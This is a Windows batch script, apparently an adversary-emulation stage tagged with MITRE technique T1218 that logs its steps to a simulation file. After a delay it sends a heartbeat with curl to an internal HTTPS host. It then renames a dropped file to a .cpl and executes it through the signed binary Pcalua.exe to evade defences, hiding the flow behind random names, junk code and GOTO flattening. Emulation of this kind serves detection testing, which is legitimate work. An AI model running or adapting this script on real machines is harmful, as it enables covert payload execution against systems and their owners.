@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET yktnwwf=%APPDATA%\8811\bb99c71c
SET fpakbq=Macula-Stage0-8811
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8811-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=taskmgr.txt
SET fpldhe=8811

SET xbhrcg=%APPDATA%\!yydue!\macula-simulations.log
SET mldjrxq=!yktnwwf!\!edjwtl!
SET gkbnwd=pcafile.cpl

timeout /t 47 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_complete=47s>> "!xbhrcg!" 2>nul

curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_executed=!rdzgrnne!>> "!xbhrcg!" 2>nul

SET znmqsp=0
SET zxcqsp=17
SET plkqz=42
SET mnbfl=99

SET plxzq=17
GOTO lkjsxc

:deadcode_aqwz
EXIT /B

:lkjsxc
IF !plxzq!==0 GOTO vxzmn
IF !plxzq!==17 GOTO plvqsd
IF !plxzq!==42 GOTO mcvxzl
IF !plxzq!==99 GOTO bnmvc

:junkcode_qwmj
ECHO FAKE >nul

:vxzmn
ping -n 11 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_operation_start>> "!xbhrcg!" 2>nul
REN "!mldjrxq!" "!gkbnwd!" 2>nul
SET ioplk=1
IF !ioplk!==1 (
    SET plxzq=42
) ELSE (
    SET plxzq=17
)
GOTO lkjsxc

:plvqsd
IF 1==1 (
    GOTO mcvxzl
) ELSE (
    GOTO deadcode_aqwz
)

:junkcode_kvbsx
SET fake=neverused

:mcvxzl
SET /A randomdelay=!RANDOM! %% 15 + 5
timeout /t !randomdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay=!randomdelay!s>> "!xbhrcg!" 2>nul

SET pcaluacmd=Pcalua.exe
SET execargs=-a "!yktnwwf!\!gkbnwd!"
SET qwefgh=0

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start=!pcaluacmd!>> "!xbhrcg!" 2>nul
!pcaluacmd! !execargs! 2>nul
IF !ERRORLEVEL!==0 (
    SET qwefgh=1
    SET errdtl=
) ELSE (
    SET qwefgh=0
    SET errdtl=exec_failed
)

SET jkldstamp=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,8!.000
echo [!jkldstamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!qwefgh!:!errdtl!>> "!xbhrcg!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_logged=T1218>> "!xbhrcg!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul
SET plxzq=99
GOTO lkjsxc

:junkcode_fghbv
REM Unreachable block

:bnmvc
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_complete>> "!xbhrcg!" 2>nul
EXIT